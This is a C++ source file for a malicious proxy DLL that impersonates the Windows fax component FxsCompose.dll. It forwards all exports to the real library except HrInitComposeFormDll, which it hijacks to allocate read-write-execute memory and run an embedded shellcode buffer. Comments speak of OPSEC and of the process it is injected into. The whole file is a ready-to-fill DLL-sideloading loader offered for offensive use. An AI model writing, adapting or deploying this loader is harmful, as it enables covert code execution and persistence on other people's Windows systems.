#include "pch.h"

// ensure every function call except our target is forwarded for functionality
#pragma comment(linker,"/export:DllMain=C:\Windows\SYSTEM32\FXSCOMPOSE.DllMain,@15")
#pragma comment(linker,"/export:FaxComposeFreeBuffer=C:\Windows\SYSTEM32\FXSCOMPOSE.FaxComposeFreeBuffer,@1")
#pragma comment(linker,"/export:HrAddressBookPreTranslateAccelerator=C:\Windows\SYSTEM32\FXSCOMPOSE.HrAddressBookPreTranslateAccelerator,@2")
#pragma comment(linker,"/export:HrDeInitAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrDeInitAddressBook,@3")
#pragma comment(linker,"/export:HrDeinitComposeFormDll=C:\Windows\SYSTEM32\FXSCOMPOSE.HrDeinitComposeFormDll,@4")
#pragma comment(linker,"/export:HrFaxComposePreTranslateAccelerator=C:\Windows\SYSTEM32\FXSCOMPOSE.HrFaxComposePreTranslateAccelerator,@5")
#pragma comment(linker,"/export:HrFreeDraftsListViewInfo=C:\Windows\SYSTEM32\FXSCOMPOSE.HrFreeDraftsListViewInfo,@6")
#pragma comment(linker,"/export:HrGetDraftsListViewInfo=C:\Windows\SYSTEM32\FXSCOMPOSE.HrGetDraftsListViewInfo,@7")
#pragma comment(linker,"/export:HrInitAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInitAddressBook,@8")
//#pragma comment(linker,"/export:HrInitComposeFormDll=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInitComposeFormDll,@9")
#pragma comment(linker,"/export:HrInvokeAddressBook=C:\Windows\SYSTEM32\FXSCOMPOSE.HrInvokeAddressBook,@10")
#pragma comment(linker,"/export:HrNewFaxComposeUI=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewFaxComposeUI,@11")
#pragma comment(linker,"/export:HrNewFaxComposeUIFromFile=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewFaxComposeUIFromFile,@12")
#pragma comment(linker,"/export:HrNewTiffViewUIFromFile=C:\Windows\SYSTEM32\FXSCOMPOSE.HrNewTiffViewUIFromFile,@13")
#pragma comment(linker,"/export:HrSelectEmailRecipient=C:\Windows\SYSTEM32\FXSCOMPOSE.HrSelectEmailRecipient,@14")

typedef DWORD(*HrInitComposeFormDll_Type)(void);

DWORD proxyfunc(void) {

    unsigned char shellcode[] = { "shellcode here" };
    unsigned int shellcode_len = 66559; // shellcode length, make sure to update to yours

    LPVOID mem; // payload buffer
    HANDLE pHandle; // process handle
    SIZE_T bytesWritten;

    // get current process handle
    pHandle = GetCurrentProcess();

    // allocate memory and set rwx access, probably use an API call more OPSEC friendly
    mem = VirtualAllocEx(pHandle, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // if no buffer, die
    if (mem == NULL) 
    {
        return -1;
    }

    // copy the shellcode into allocated memory, again probably use an API call more OPSEC friendly
    WriteProcessMemory(pHandle, mem, (LPCVOID)&shellcode, shellcode_len, &bytesWritten);

    // execute shellcode
    ((void(*)())mem)();

    return 0;

    // load original DLL and get function pointer
    HMODULE hModule = LoadLibrary(L"C:\\Windows\\System32\\FxsCompose.dll");
    HrInitComposeFormDll_Type Original_HrInitComposeFormDll = (HrInitComposeFormDll_Type)GetProcAddress(hModule, "HrInitComposeFormDll");

    // call original function, again for functionality of the process you're injected into
    DWORD result = Original_HrInitComposeFormDll();

    return result;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

